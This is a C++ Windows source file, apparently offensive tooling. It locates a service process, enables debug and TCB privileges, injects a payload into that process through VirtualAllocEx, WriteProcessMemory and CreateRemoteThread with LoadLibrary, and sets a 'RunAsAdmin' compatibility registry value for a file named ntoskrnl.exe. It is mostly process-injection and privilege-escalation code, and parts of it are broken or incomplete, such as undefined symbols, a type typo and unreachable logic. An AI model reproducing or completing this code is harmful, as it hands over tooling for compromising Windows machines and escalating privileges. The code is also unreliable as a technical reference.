/*
2017 - 2020
Copyrights: Sp7,
Numéro du projet sept sérine
*/

#pragma once
#include "stdafx.h"
#include "Header.h"

std::string Exec(const char* cmd) {
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (!feof(pipe)) {
			if (fgets(buffer, 128, pipe) != NULL)
				result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}


LPWSTR ConvertToLPWSTR(const std::string& s)
{
	LPWSTR ws = new wchar_t[s.size() + 1];
	copy(s.begin(), s.end(), ws);
	ws[s.size()] = 0;
	return ws;
}

void GetLRPC(
		char Arr[]
	) 
{
	int x = 0;
	vector<string> Lrp;
	Lrp.resize(20);
	for (int y = 0;y < 19;y++) {
		Lrp[y] = string("");
	}
	char LRPC[19];
	for (int y = 0;y < (12 * 1024);y++) {
		if (Arr[y] == 'L') {
			if (Arr[y + 1] == 'R') {
				if (Arr[y + 2] == 'P') {
					if (Arr[y + 3] == 'C') {
						for (int j = 5; j < 23; j++) {
							LRPC[j - 5] = Arr[y + j];
							Lrp[x].push_back(LRPC[j - 5]);
							//cout << LRPC[j-5];
						}
						x++;
						//Lrpc[0] = LRPC;
					}
				}
			}
		}
	}
#ifdef _UNICODE 
#define DeviceProperties_RunDLL  "DeviceProperties_RunDLLW"
	typedef void(_stdcall *PDEVICEPROPERTIES)(
		HWND hwndStub,
		HINSTANCE hAppInstance,
		LPWSTR lpCmdLine,
		int nCmdShow
		);
#else
#define DeviceProperties_RunDLL  "DeviceProperties_RunDLLA"
	typedef void(_stdcall *PDEVICEPROPERTIES)(
		HWND hwndStub,
		HHINSTANCE hAppInstance,
		LPSTR lpCmdLine,
		int nCmdShow
		);
#endif

	PDEVICEPROPERTIES pDeviceProperties;
	for (int r = 0;r < 19;r++) {
		//for (int o = 0; o < 19; o++) {
		//cout << Lrp[r];
		string Cmd = "rundll32.exe devmgr.dll,DeviceProperties_RunDLL /DeviceID ";
		//string Cmd = "C:\\Program Files\\Debugging Tools for Windows\dbgrpc -p ncacn_np -l -P "; 
		Cmd += Lrp[r];
		//Cmd +=	" -L 0.1";
		cout << Cmd;
		LPCTSTR Cmnd = ConvertToLPWSTR(Cmd);
		//ShellExecute((HWND)GetCurrentProcess(), L"open", Cmnd, NULL, NULL, 1);
		const char *command = Cmd.c_str();
		HINSTANCE  hDevMgr = LoadLibrary(_TEXT("devmgr.dll"));
		if (hDevMgr) {
		pDeviceProperties = (PDEVICEPROPERTIES)GetProcAddress((HMODULE)hDevMgr, DeviceProperties_RunDLL);
			pDeviceProperties((HWND)GetCurrentProcess(), NULL, _TEXT("/DeviceID PCI\\VEN_8086\&DEV_2445\&SUBSYS_010E1028\&REV_12\\3\&172E68DD\&0\&FD"), NULL);
		}
		string Sh = Exec(command);
		cout << Sh;
		int j;
		cin >> j;
		//}
		cout << endl << endl << endl;
	}
}

void PrintHex(
		PBYTE Data,
		ULONG dwBytes
	) 
{
	char LRp[ 12* 1024];
	bool Flag = false;
	int counter = 0; int y = 0;
	for (ULONG i = 0; i < dwBytes; i += 16) {
		try {
			printf("%.8x: ", i);
		}
		catch (const std::exception& e) {
			goto EXIT;
		}

		for (ULONG j = 0; j < 16; j++) {
			if (i + j < dwBytes) {
				try {
					printf("%.2x ", Data[i + j]);
				}
				catch (const std::exception& e) {
					goto EXIT;
				}
			}
			else {
				printf("?? ");
			}

		}
			for (ULONG j = 0; j < 16; j++) {
				if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
					printf("%c", Data[i + j]);
					if (Data[i + j]  == 'L') {
									Flag = true;
									counter = 0;
					}
					if (Flag) {  
						LRp[y] = Data[i + j];
						y++;
					}
				}
				else {
					printf(".");
				}
			}

			printf("\n");
	}
EXIT:
	GetLRPC(LRp);
}

typedef struct GrantAccesParam {
	DWORD _myluid = GetCurrentProcessId();
	HANDLE _foreign;
	HANDLE mHandle = GetCurrentProcess();
	DWORD _foreignPuid;
	PCSTR _srvName;
	TCHAR lpdllpath[MAX_PATH];
	LPCTSTR SubKey;
	LPCTSTR Val;
	LPCTSTR lDat;
} AccessParam;

UINT_PTR GetProcessBaseAddress(DWORD processID, HANDLE processHandle)
{
	DWORD_PTR   baseAddress = 0;

	HMODULE     *moduleArray;
	LPBYTE      moduleArrayBytes;
	DWORD       bytesRequired;

	if (processHandle)
	{
		if (EnumProcessModulesEx(processHandle, NULL, 0, &bytesRequired, 0x02))
		{
			if (bytesRequired)
			{
				moduleArrayBytes = (LPBYTE)LocalAlloc(LPTR, bytesRequired);

				if (moduleArrayBytes)
				{
					unsigned int moduleCount;

					moduleCount = bytesRequired / sizeof(HMODULE);
					moduleArray = (HMODULE *)moduleArrayBytes;

					if (EnumProcessModulesEx(processHandle, moduleArray, bytesRequired, &bytesRequired, 0x02))
					{
						baseAddress = (DWORD_PTR)moduleArray[0];
					}

					LocalFree(moduleArrayBytes);
				}
			}
		}

	}

	return baseAddress;
}

bool insertDll(
	DWORD procID,
	LPCTSTR Cmnd,
	GrantAccesParam &Gp
)
{
	DWORD ReturnLength = 0;
	HMODULE hLocKernel32 = GetModuleHandle(L"Kernel32");
	FARPROC hLocLoadLibrary = GetProcAddress(hLocKernel32, "LoadLibraryA");
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	DWORD address = 0x100579C;
	int value = 0;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);  //   (LPCWSTR)SE_MACHINE_ACCOUNT_PRIVILEGE
		tkp.PrivilegeCount = 6;
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		tkp.Privileges[1].Attributes = 0x00040000L;
		tkp.Privileges[2].Attributes = 0x00080000L;
		tkp.Privileges[3].Attributes = 0x0080;
		tkp.Privileges[4].Attributes = 0x0200;
		tkp.Privileges[5].Attributes = 0x00020000L;
		AdjustTokenPrivileges(hToken, 0, &tkp, sizofPayload, NULL, NULL);
	}

	HANDLE hProc = OpenProcess(PROCESS_VM_READ, TRUE, procID);
	ShellExecute((HWND)GetCurrentProcess(), L"open", Cmnd, NULL, NULL, 0);
	PBYTE OutputBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0);
	try {
		PrintHex(OutputBuffer, 12 * 1024);
		int brk;
		cin >> brk;
	}
	catch (const std::exception& e) {
	}
	LPVOID hRemoteMem = VirtualAllocEx(hProc, NULL, sizofPayload, MEM_COMMIT, PAGE_READWRITE);
	DWORD numBytesWritten;
	try {
		WriteProcessMemory(hProc, hRemoteMem, (LPCVOID)payload, sizofPayload, &numBytesWritten);
	}
	catch (const std::exception& e) {
		cout << e.what();
		cout << "Thrown";
	}
	HANDLE hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)hLocLoadLibrary, hRemoteMem, 0, NULL);
	cout << "..../////";
	cout << hRemoteThread << endl;
	bool res = false;
	if (hRemoteThread)
		res = (bool)WaitForSingleObject(hRemoteThread, INFINITE);
	VirtualFreeEx(hProc, hRemoteMem, sizofPayload, MEM_RELEASE);
	CloseHandle(hProc);

	return res;
}

BOOL AddRegKeyValue(LPCTSTR SubK, LPCTSTR lValu, LPCTSTR lDat)
{
	HKEY hKey;
	BOOL bResult = FALSE;
	DWORD dwDisposition = 0;
	REGSAM samDesired = KEY_ALL_ACCESS;

	if (RegCreateKeyEx(HKEY_CURRENT_USER, SubK, 0, NULL, 0, samDesired, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS)
	{
		goto EXIT;
	}

	if (RegSetValueEx(hKey, lValu, 0, REG_SZ, (const PBYTE)lDat, (_tcslen(lDat) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	bResult = TRUE;

EXIT:
	RegCloseKey(hKey);

	return bResult;
}

HANDLE GetProcessByName(
	PCSTR name,
	GrantAccesParam &Gp
)
{
	DWORD pid = 0;
	HANDLE processHandle = NULL;
	TCHAR filename[MAX_PATH];
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	if (Process32First(snapshot, &process))
	{
		do
		{
			std::wstring mywstr(process.szExeFile);
			std::string mycstr(mywstr.begin(), mywstr.end());
			if (mycstr.c_str() == string(name))
			{
				pid = process.th32ProcessID;
				Gp._foreignPuid = pid;
				processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
				if (processHandle != NULL) {
					if (GetModuleFileNameEx(processHandle, NULL, filename, MAX_PATH) == 0) {
						cout << "Not Autorized" << endl;
						break;
					}
					else {
						*Gp.lpdllpath = *filename;
					}
					CloseHandle(processHandle);
				}
				break;
			}
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);

	if (pid != 0)
	{
		return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	}
	return NULL;
}


BOOL SetPrivilege(
	HANDLE hToken,
	LPCTSTR lpszPrivilege,
	BOOL bEnablePrivilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		cout << "///............................";
	return false;

	LookupPrivilegeValue(NULL, SE_SECURITY_NAME,
		&tp.Privileges[0].Luid);

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	try {
		AdjustTokenPrivileges(hToken, FALSE, &tp, 0,
			(PTOKEN_PRIVILEGES)NULL, 0);
		cout << "1234";
		return true;
	}
	catch (const std::exception& e) {
		cout << e.what();
		cout << "............;;;;;;;;;;;;";
	}

	if (!LookupPrivilegeValue(
		NULL,
		lpszPrivilege,
		&luid))
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

int main(
	int argc,
	char* argv[]
)
{
#ifndef _TY
#include <Lmcons.h>
#endif
	string MemExe = (string)argv[0];
	string Ptr = "";
	string Pt = "";
	for (int j = 0; j < MemExe.length() - 26;j++) {
		if (MemExe[j] == *"\\") {
			Ptr += "\\";
		}
			Pt += MemExe[j];
			Ptr += MemExe[j];
	}
	Ptr += "\\";
	AccessParam Ap;
	Ptr += "ntoskrnl.exe";
	Pt += "ntoskrnl.exe";
	Ap.SubKey = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers";
	Ap.Val = ConvertToLPWSTR(Pt);
	Ap.lDat = L"RunAsAdmin";
	bool Auto = AddRegKeyValue(Ap.SubKey, Ap.Val, Ap.lDat);
	PCSTR yuid;
	HANDLE Atoken;
	bool Aut = SetPrivilege(Ap.mHandle, SE_TCB_NAME, true);
	for (int j = 0; j < Srvs.size(); j++) {
		try {
			HANDLE _proc = GetProcessByName(Srvs[j], Ap);
			if (_proc != NULL) {
				yuid = Srvs[j];
				Atoken = _proc;
				Ap._foreign = Atoken;
				Ap._srvName = yuid;
				break;
			}
		}
		catch (const std::exception& e) {
			cout << e.what();
		}
	}
	if (Atoken != NULL) {
		auto size = wcslen(Ap.lpdllpath) * sizeof(TCHAR);
		try {
#ifndef _DEBUG_TWO
			auto pNameInVictimProcess = VirtualAllocEx(
				Ap._foreign,
				nullptr,
				size,
				MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			auto bStatus = WriteProcessMemory(
				Ap._foreign,
				pNameInVictimProcess,
				(LPCVOID)payload,
				sizofPayload,
				nullptr
			);
			UINT_PTR baseAddress = GetProcessBaseAddress(Ap._foreignPuid, Ap._foreign);
			cout << "base address" << baseAddress << endl;
			DWORD ptrAddress;
			auto get = ReadProcessMemory(Ap._foreign, (void*)baseAddress, &ptrAddress, sizeof(DWORD), 0);
			if (get == 0) {
				cout << endl;
				DWORD WINAPI GetLastError(void);
				DWORD le = GetLastError();
				cout << le << endl;
			}
			bool loaded = false;
			auto hKernel32 = GetModuleHandle(L"kernel32.dll");
			TOKEN_INFORMATION_CLASS Pic;
			LPVOID Tinf = NULL;
			DWORD len = NULL;
			PDWORD Out = NULL;
			if (hKernel32 != NULL) {
				loaded = true;
				cout << "loaded... " << endl;
			}
			loaded = true;
			if (!loaded) {
				auto hKernel32 = GetModuleHandle(L"user32.dll");
			}
			auto LoadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryW");
			auto hThreadId = CreateRemoteThread(
				Ap._foreign,
				nullptr,
				get,
				reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryAddress),
				pNameInVictimProcess,
				NULL,
				nullptr
			);
			WaitForSingleObject(hThreadId, INFINITE);
			bool getToken = OpenProcessToken(
				Ap._foreign,
				TOKEN_QUERY,
				NULL
			);
			cout << getToken;
			bool Ins = insertDll(Ap._foreignPuid, ConvertToLPWSTR(Ptr),Ap);
			int a;
			cin >> a;
			CloseHandle(Ap._foreign);
			VirtualFreeEx(Ap._foreign, pNameInVictimProcess, size, MEM_RELEASE);

		}
		catch (const std::exception& e) {
			cout << e.what();
		}
		return -1;
#endif
	}
	return 0;
}


